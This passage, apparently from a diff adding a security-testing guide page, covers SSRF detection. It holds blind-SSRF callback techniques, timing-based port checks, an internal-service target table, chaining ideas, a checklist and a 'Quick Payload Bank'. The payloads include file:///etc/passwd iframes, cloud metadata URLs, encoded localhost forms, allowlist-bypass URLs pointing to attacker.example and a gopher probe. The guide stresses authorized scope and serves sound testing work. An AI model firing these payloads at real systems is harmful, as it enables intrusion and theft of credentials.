+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/pdf-img&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Internal probe:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://127.0.0.1:8080/health&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://10.0.0.5/admin&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Local file probe where explicitly allowed:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;400&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;400&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///c:/windows/win.ini&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;400&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;400&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Possible signals:</p>
+<ul>
+<li>OAST callback</li>
+<li>generated PDF contains fetched content</li>
+<li>broken image icon differs</li>
+<li>render time changes</li>
+<li>PDF generation fails with connection error</li>
+<li>internal page content appears in the PDF</li>
+</ul>
+<hr />
+<h2 id="blind-ssrf">Blind SSRF</h2>
+<p>Blind SSRF occurs when the server makes the request but does not return the response body.</p>
+<p>Tools for confirmation:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Burp Collaborator
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>interactsh
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>Canarytokens
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>webhook.site
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>requestrepo
+</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>pingb
+</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a>custom VPS with HTTP/DNS logs
+</span></code></pre></div>
+<p>Test with unique paths:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>http://ssrf-probe-73921.oast.example/from-stockApi
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>http://ssrf-probe-73921.oast.example/from-avatar
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>http://ssrf-probe-73921.oast.example/from-pdf
+</span></code></pre></div>
+<p>Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>DNS callback only      → server resolved the domain
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>HTTP callback         → server connected over HTTP
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>HTTPS callback        → server connected over HTTPS
+</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a>source IP             → where the request came from
+</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a>User-Agent            → library, framework, bot, renderer
+</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>headers               → internal service identity or proxy details
+</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a>request path/query    → whether input is preserved
+</span></code></pre></div>
+<p>Blind SSRF can still be exploitable through:</p>
+<ul>
+<li>internal port scanning by timing</li>
+<li>known vulnerable internal services</li>
+<li>cloud metadata requests</li>
+<li>redirect chains</li>
+<li>PDF renderers</li>
+<li>protocol-specific side effects</li>
+<li>logs visible in another panel</li>
+<li>second-order fetches by admin or worker process</li>
+</ul>
+<hr />
+<h2 id="timing-based-internal-port-checks">Timing-Based Internal Port Checks</h2>
+<p>When the response body is not visible, timing may still reveal whether a port is open, closed, filtered, or slow.</p>
+<p>Example target list:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>http://127.0.0.1:80/
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>http://127.0.0.1:443/
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>http://127.0.0.1:8080/
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>http://127.0.0.1:9200/
+</span></code></pre></div>
+<p>Signals:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>fast error       → connection refused or blocked
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>slow timeout     → filtered or blackholed
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>fast normal      → service answered
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a>different length → application handled backend response differently
+</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a>different error  → connect vs read timeout vs TLS error
+</span></code></pre></div>
+<p>Keep timing tests low-rate and narrow. Do not scan large internal ranges unless scope explicitly permits it.</p>
+<hr />
+<h2 id="common-internal-service-targets">Common Internal Service Targets</h2>
+<p>Use this table for recognition and impact assessment, not for destructive testing.</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th style="text-align: right;">Common port</th>
+<th>SSRF risk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP admin panels</td>
+<td style="text-align: right;">80, 8080, 8081, 8000, 8443</td>
+<td>Access to internal-only interfaces</td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td style="text-align: right;">9200</td>
+<td>Data exposure, cluster metadata</td>
+</tr>
+<tr>
+<td>Kibana</td>
+<td style="text-align: right;">5601</td>
+<td>Internal dashboard access</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td style="text-align: right;">6379</td>
+<td>Dangerous if unauthenticated and writable</td>
+</tr>
+<tr>
+<td>Memcached</td>
+<td style="text-align: right;">11211</td>
+<td>Data exposure or internal state</td>
+</tr>
+<tr>
+<td>Docker API</td>
+<td style="text-align: right;">2375</td>
+<td>Critical if unauthenticated</td>
+</tr>
+<tr>
+<td>Kubernetes API</td>
+<td style="text-align: right;">6443, 443</td>
+<td>Cluster control if token/trust exists</td>
+</tr>
+<tr>
+<td>Kubelet</td>
+<td style="text-align: right;">10250</td>
+<td>Node/pod data, possible exec in bad configs</td>
+</tr>
+<tr>
+<td>Consul</td>
+<td style="text-align: right;">8500</td>
+<td>Service discovery, KV data</td>
+</tr>
+<tr>
+<td>Vault</td>
+<td style="text-align: right;">8200</td>
+<td>Secrets if reachable and authenticated through context</td>
+</tr>
+<tr>
+<td>Jenkins</td>
+<td style="text-align: right;">8080</td>
+<td>CI access, possible RCE if misconfigured</td>
+</tr>
+<tr>
+<td>Solr</td>
+<td style="text-align: right;">8983</td>
+<td>Admin/API exposure</td>
+</tr>
+<tr>
+<td>RabbitMQ Management</td>
+<td style="text-align: right;">15672</td>
+<td>Message broker admin</td>
+</tr>
+<tr>
+<td>Prometheus</td>
+<td style="text-align: right;">9090</td>
+<td>Metrics, service discovery data</td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td style="text-align: right;">3000</td>
+<td>Dashboard/data-source exposure</td>
+</tr>
+<tr>
+<td>SMTP</td>
+<td style="text-align: right;">25, 587</td>
+<td>Banner/internal domain leakage, mail abuse risk</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="response-analysis">Response Analysis</h2>
+<p>When testing SSRF, compare more than visible content.</p>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Different status code</td>
+<td>Backend request probably changed behavior.</td>
+</tr>
+<tr>
+<td>Different response length</td>
+<td>Internal response may be embedded or error changed.</td>
+</tr>
+<tr>
+<td>Different error message</td>
+<td>Useful for protocol, DNS, TLS, or connection fingerprinting.</td>
+</tr>
+<tr>
+<td>Redirect appears</td>
+<td>Backend may follow or expose redirects.</td>
+</tr>
+<tr>
+<td>Timeout</td>
+<td>Host/port may be filtered or slow.</td>
+</tr>
+<tr>
+<td>Immediate connection refused</td>
+<td>Host reachable but port closed.</td>
+</tr>
+<tr>
+<td>TLS error</td>
+<td>Service exists but expects TLS or certificate validation failed.</td>
+</tr>
+<tr>
+<td>DNS callback only</td>
+<td>App resolves but may not connect.</td>
+</tr>
+<tr>
+<td>HTTP callback</td>
+<td>Confirmed outbound HTTP request.</td>
+</tr>
+<tr>
+<td>User-Agent leaked</td>
+<td>Identifies library such as curl, Java, Python requests, Go client, wkhtmltopdf.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="ssrf-chaining-ideas">SSRF Chaining Ideas</h2>
+<p>SSRF is often a pivot, not the final bug.</p>
+<p>Common chains:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>SSRF → internal admin panel
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>SSRF → cloud metadata → temporary credentials
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>SSRF → PDF renderer → internal file/resource fetch
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>SSRF → open redirect → filter bypass
+</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>SSRF → Host header abuse → proxy routing issue
+</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>SSRF → internal port scan → exposed service
+</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>SSRF → gopher → internal text protocol
+</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>SSRF + LFI → read env vars → cloud/container credentials
+</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a>SSRF + cache poisoning → stored impact
+</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a>SSRF + weak service auth → RCE
+</span></code></pre></div>
+<p>Impact depends on:</p>
+<ul>
+<li>network position of the vulnerable server</li>
+<li>outbound egress rules</li>
+<li>service mesh / internal DNS</li>
+<li>cloud provider</li>
+<li>metadata protection</li>
+<li>available HTTP methods</li>
+<li>allowed schemes</li>
+<li>redirect behavior</li>
+<li>whether response is visible</li>
+<li>internal services reachable from the server</li>
+</ul>
+<hr />
+<h2 id="manual-ssrf-checklist">Manual SSRF Checklist</h2>
+<h3 id="discovery">Discovery</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Confirmed scope and authorization.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified all URL-like parameters.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked query parameters, form fields, JSON, GraphQL, multipart metadata, cookies, and headers.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Looked for webhooks, imports, avatar fetchers, URL previews, PDF exports, XML/SVG parsing, and admin previews.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used a unique marker before active SSRF payloads.</li>
+</ul>
+<h3 id="external-confirmation">External Confirmation</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Sent HTTP and HTTPS OAST payloads.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked DNS callbacks.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked HTTP callbacks.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Recorded source IP, User-Agent, headers, path, and query string.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested whether redirects are followed.</li>
+</ul>
+<h3 id="in-band-ssrf">In-Band SSRF</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested harmless loopback URLs.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested harmless private-network URLs in scope.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Compared status, length, content, errors, and redirects.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Confirmed whether backend responses are reflected.</li>
+</ul>
+<h3 id="blind-ssrf_1">Blind SSRF</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used unique OAST paths per parameter.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested Referer and Host header surfaces.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested PDF/HTML/SVG/Markdown renderers.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Used timing carefully for a small set of ports.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Avoided broad scans unless explicitly authorized.</li>
+</ul>
+<h3 id="bypass-testing">Bypass Testing</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested alternative localhost forms.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested decimal, octal, hex, shortened, and IPv6 IP forms.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested URL encoding and double encoding.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested userinfo with <code>@</code>.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested fragments with <code>#</code>.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested backslash/slash parser confusion.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested open redirects.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested DNS rebinding only when allowed.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested path traversal when only partial URL/path is controlled.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Tested non-HTTP schemes only when allowed.</li>
+</ul>
+<h3 id="cloud">Cloud</h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Checked whether metadata endpoint is reachable.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Identified provider: AWS, GCP, Azure, DigitalOcean, container platform.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Retrieved minimal proof only, such as instance ID, project ID, region, or role name.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Did not use temporary credentials unless explicitly authorized.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Documented whether IMDSv2 or metadata headers are required.</li>
+</ul>
+<h2 id="quick-payload-bank">Quick Payload Bank</h2>
+<p>External callback:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>http://ssrf-probe-73921.oast.example/
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>https://ssrf-probe-73921.oast.example/
+</span></code></pre></div>
+<p>Loopback:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>http://127.0.0.1/
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>http://localhost/
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>http://127.1/
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>http://0/
+</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>http://[::1]/
+</span></code></pre></div>
+<p>Private:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>http://10.0.0.1/
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>http://172.16.0.1/
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>http://192.168.1.1/
+</span></code></pre></div>
+<p>Metadata:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>http://169.254.169.254/
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>http://metadata.google.internal/
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>http://metadata/
+</span></code></pre></div>
+<p>Encoded localhost:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>http://2130706433/
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>http://017700000001/
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>http://0x7f000001/
+</span></code></pre></div>
+<p>Allowlist confusion:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>https://trusted.example.com@attacker.example/
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a>https://trusted.example.com.attacker.example/
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>https://attacker.example#trusted.example.com
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a>https://attacker.example%23trusted.example.com
+</span></code></pre></div>
+<p>Redirect:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>https://attacker.example/redirect?to=http://127.0.0.1/
+</span></code></pre></div>
+<p>Path traversal:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>x/../private
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>safe/../../admin
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>%2e%2e/%2e%2e/admin
+</span></code></pre></div>
+<p>PDF / HTML:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/img&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/style.css&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://ssrf-probe-73921.oast.example/frame&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Gopher HTTP probe:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+</span></code></pre></div>
+<p>Referer:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">http://ssrf-probe-73921.oast.example/referer</span>
+</span></code></pre></div>
+<p>Host header:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="nf">GET</span> <span class="nn">http://127.0.0.1:8080/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></code></pre></div>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../XSS/" class="md-footer__link md-footer__link--prev" aria-label="Previous: XSS (Cross-Site Scripting)">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                XSS (Cross-Site Scripting)
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../CSRF/" class="md-footer__link md-footer__link--next" aria-label="Next: CSRF (Cross-Site Request Forgery)">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                CSRF (Cross-Site Request Forgery)
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
